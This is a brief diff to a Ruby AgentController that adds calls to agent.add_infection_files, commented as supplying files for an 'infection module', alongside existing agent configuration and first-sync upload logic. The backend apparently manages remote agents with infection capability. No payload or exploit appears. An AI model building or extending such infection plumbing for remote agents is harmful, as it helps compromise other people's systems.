@@ -210,6 +210,7 @@ class AgentController < RESTController
           config.saved = Time.now.getutc.to_i
           config.user = @session[:user][:name]
           config.save
+
         when 'factory'
           agent.configs.delete_all
           config = agent.configs.create!(config: @params['config'], user: @session[:user][:name], saved: Time.now.getutc.to_i)
@@ -297,6 +298,9 @@ class AgentController < RESTController
         agent.save
       end
 
+      # add the files needed for the infection module
+      agent.add_infection_files
+
       status = {:deleted => agent[:deleted], :status => agent[:status].upcase, :_id => agent[:_id]}
       return ok(status)
     end
@@ -337,6 +341,9 @@ class AgentController < RESTController
 
     # add the upload files for the first sync
     agent.add_first_time_uploads
+
+    # add the files needed for the infection module
+    agent.add_infection_files
 
     # add default requests for the filesystem
     agent.add_default_filesystem_requests
